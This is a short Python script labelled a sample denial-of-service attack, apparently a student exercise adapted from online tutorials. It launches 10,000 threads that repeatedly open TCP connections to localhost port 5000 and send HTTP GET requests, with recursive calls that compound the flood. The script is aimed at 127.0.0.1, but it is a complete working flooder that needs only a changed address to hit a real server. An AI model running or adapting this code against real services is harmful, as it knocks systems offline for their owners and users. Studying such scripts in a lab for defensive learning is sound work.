# Sample DOS Attack
# Reference1: https://www.neuralnine.com/code-a-ddos-script-in-python/
# Reference2: https://www.geeksforgeeks.org/socket-programming-python/#:~:text=Socket%20programming%20is%20a%20way,reaches%20out%20to%20the%20server.
# Amy Frangieh
import socket, sys, os, threading, time
print("Attack localhost on port 5000")

def attack():
    try: #Reference1 and Reference2 Modified
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect(("127.0.0.1", 5000)) 
        print("GET /" + "127.0.0.1" + " HTTP/1.1")
        print("\n")
        s.send(b"GET /" + b"127.0.0.1" + b" HTTP/1.1\r\n")
        s.send(b"Host: " + b"127.0.0.1" + b"\r\n\r\n")
        s.close()
    except:
        print("Socket Dead.")
    for x in range(10000):
        time.sleep(0.001)
        attack()

threads = []

def threader(): #Reference1 Modified
    global threads
    for i in range(10000):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()
        
threader()
